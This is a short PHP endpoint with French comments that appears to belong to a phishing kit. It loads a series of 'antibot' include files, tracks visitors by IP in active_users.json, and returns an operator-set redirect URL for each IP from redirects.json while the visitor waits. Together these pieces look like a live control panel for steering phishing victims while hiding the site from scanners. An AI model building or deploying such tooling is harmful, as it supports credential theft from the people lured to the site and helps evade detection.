<?php

session_start();
include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';
$ip = $_SERVER['REMOTE_ADDR'];
$filepath = 'redirects.json';

if (!file_exists($filepath)) {
    echo json_encode(['status' => 'waiting']);
    exit;
}

$redirects = json_decode(file_get_contents($filepath), true);

if (isset($redirects[$ip])) {
    $url = $redirects[$ip];

    // Marquer l'utilisateur comme redirigé dans active_users.json
    $usersFile = 'active_users.json';
    if (file_exists($usersFile)) {
        $users = json_decode(file_get_contents($usersFile), true);
        if (isset($users[$ip])) {
            $users[$ip]['status'] = 'redirected';
            file_put_contents($usersFile, json_encode($users, JSON_PRETTY_PRINT));
        }
    }

    // Supprimer la redirection après l’avoir renvoyée (optionnel)
    unset($redirects[$ip]);
    file_put_contents($filepath, json_encode($redirects, JSON_PRETTY_PRINT));

    echo json_encode(['status' => 'redirect', 'url' => $url]);
} else {
    echo json_encode(['status' => 'waiting']);
}
?>
